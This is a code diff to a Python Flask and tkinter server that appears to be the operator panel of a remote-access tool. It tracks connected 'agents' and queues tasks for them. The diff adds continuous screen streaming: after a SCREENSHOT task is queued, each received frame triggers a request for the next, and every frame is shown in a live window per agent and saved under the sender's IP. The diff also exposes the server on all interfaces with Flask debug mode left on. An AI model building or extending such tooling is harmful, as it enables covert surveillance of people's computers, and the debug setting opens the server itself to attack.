@@ -3,11 +3,16 @@ import threading
 import tkinter as tk
 import time
 import queue
+import io
 from tkinter import ttk
+from PIL import Image, ImageTk
 import os as oos
 
 
 log_queue = queue.Queue()
+image_queue = queue.Queue()
+agent_windows = {}
+streaming_agents = set()
 OFFLINE_TIMEOUT = 15
 OFFLINE_CHECK_PERIOD = 5
 users = []
@@ -43,6 +48,50 @@ class Connections:
     
 
 app = Flask(__name__)
+
+
+def open_image_window(agent_id, label, img_bytes):
+    if agent_id not in streaming_agents:
+        return
+
+    img = Image.open(io.BytesIO(img_bytes))
+    img.thumbnail((640, 400))
+    photo = ImageTk.PhotoImage(img)
+
+    if agent_id in agent_windows:
+        data = agent_windows[agent_id]
+        data["img_label"].config(image=photo)
+        data["img_label"].image = photo
+        data["win"].lift()
+        data["win"].after(1000, data["request_next"])
+        return
+
+    win = tk.Toplevel(root)
+    win.title(label)
+    win.configure(bg="#0D0D0D")
+    win.resizable(False, False)
+
+    img_label = tk.Label(win, image=photo, bg="#0D0D0D")
+    img_label.image = photo
+    img_label.pack(padx=10, pady=(10, 5))
+
+    def request_next():
+        if agent_id not in agent_windows:
+            return
+        user = get_user(agent_id)
+        if user:
+            user.add_task("SCREENSHOT")
+
+    agent_windows[agent_id] = {"win": win, "img_label": img_label, "request_next": request_next}
+
+    def on_close():
+        streaming_agents.discard(agent_id)
+        agent_windows.pop(agent_id, None)
+        win.destroy()
+
+    win.protocol("WM_DELETE_WINDOW", on_close)
+
+    request_next()
 
 
 def render():
@@ -151,7 +200,10 @@ def render():
             return
 
         task = allowed_tasks[task_name]
-        
+
+        if task == "SCREENSHOT":
+            streaming_agents.add(agent_id)
+
         get_user(agent_id).add_task(task)
         log(f"[*] {task} for {get_user(agent_id).ip} queued")
         
@@ -248,8 +300,15 @@ def render():
 
         root.after(300, update_console)
 
+    def check_image_queue():
+        while not image_queue.empty():
+            agent_id, label, img_bytes = image_queue.get()
+            open_image_window(agent_id, label, img_bytes)
+        root.after(500, check_image_queue)
+
     update_connections_list()
     update_console()
+    check_image_queue()
 
     root.mainloop()
 def log(message):
@@ -312,13 +371,21 @@ def task_check():
 def screenshot():
     id = request.form.get("id")
     file = request.files.get("file")
-    
+
     if not file or not id:
         return jsonify({"error": "missing data"}), 400
-    
+
+    img_bytes = file.read()
+
+    user = get_user(id)
+    label = user.name if user else request.remote_addr
+
     oos.makedirs("screenshots", exist_ok=True)
-    file.save(f"screenshots/{request.remote_addr}:{time.time()}.png")
-    log(f"    > Screenshot received from {request.remote_addr} ")
+    with open(f"screenshots/{request.remote_addr}_{time.time()}.png", "wb") as f:
+        f.write(img_bytes)
+
+    image_queue.put((id, label, img_bytes))
+    log(f"    > Frame received from {request.remote_addr}")
     return "OK"
 
 def handling_inactive_connections(connections):
@@ -331,7 +398,7 @@ def handling_inactive_connections(connections):
   
 
 def run_server():
-    app.run(debug=True, use_reloader=False)
+    app.run(host="0.0.0.0", debug=True, use_reloader=False)
 
 
 
